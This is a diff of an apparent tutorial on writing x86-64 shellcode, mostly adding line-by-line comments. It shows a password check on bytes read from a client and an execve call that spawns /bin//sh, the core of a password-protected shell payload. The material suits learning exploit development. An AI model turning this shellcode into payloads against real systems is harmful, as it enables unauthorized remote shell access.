@@ -272,19 +272,23 @@ if (strcmp(arguments[3], buf) == 0)
 ```
 
 ```nasm
-xor rax, rax ;zero out rax - read syscall number = 0
-push r10 ;push 8 bytes to the stack for 16 byte password support
-mov rsi, rsp ;move the stack pointer to the 16 bytes into rsi for second argument 
-mov rdx, 16 ;move the value 16 into rdx as third argument
-syscall ;syscall read instruction
+        xor rax, rax ;zero out rax - read syscall number = 0
+        push r10 ;push 8 bytes to the stack for 16 byte password support
+        mov rsi, rsp ;move the stack pointer to the 16 bytes into rsi for second argument 
+        mov rdx, 16 ;move the value 16 into rdx as third argument
+        syscall ;syscall read instruction
 
-mov rax, [rel pass] ;load password variable into rax
-mov rdi, rsi ;load the 8 bytes received from the client into rdi
-scasq ;scasq will compare rax with rdi 
-jne exit ;if the two strings contained within rax and rdi do not match, then jump to our exit syscall instruction
+        mov rax, [rel pass] ;load password variable into rax
+        mov rdi, rsi ;load the 8 bytes received from the client into rdi
+        scasq ;scasq will compare rax with rdi 
+        jne exit ;if the two strings contained within rax and rdi do not match, then jump to our exit syscall instruction
 
-; change as needed
-pass: db "8bytesss" ;define a password
+        ; change as needed
+        pass: db "8bytesss" ;define a password
+
+exit:
+        mov rax, 60 ;syscall number for exit = 60
+        syscall ;syscall exit instruction
 ```
 
 <h3>Stage 7 - Spawn the shell, if password is correct</h3>
@@ -332,21 +336,17 @@ execve(arguments[0], &arguments[0], NULL);
         xor rax, rax ;zero out rax
         push rax ;push 8 zero bytes onto the stack for third argument 
 
-        mov rbx, 0x68732f2f6e69622f
-        push rbx
+        mov rbx, 0x68732f2f6e69622f ;move the /bin//sh string to rbx register
+        push rbx ;push the value onto the stack
 
-        mov rdi, rsp
+        mov rdi, rsp ;the stack pointer now points to the address of /bin//sh and 8 zero bytes on the stack so lets move that to rdi for first argument
 
-        push rax
+        push rax ; Lets add another 8 zero bytes on the stack
 
-        mov rdx, rsp
+        mov rdx, rsp ; the stack pointer now points to 8 zero bytes, so lets move that into rdx for third argument
 
-        push rdi
-        mov rsi, rsp
-        mov rax, 59
-        syscall
-
-exit:
-        mov rax, 60
-        syscall
+        push rdi ; rdi is currently pointing to the address of /bin//sh so lets put that on the stack
+        mov rsi, rsp ;move the stack pointer for address of /bin//sh into rsi for second argument
+        mov rax, 59 ;syscall number for execve
+        syscall ;execve syscall instruction
 ```
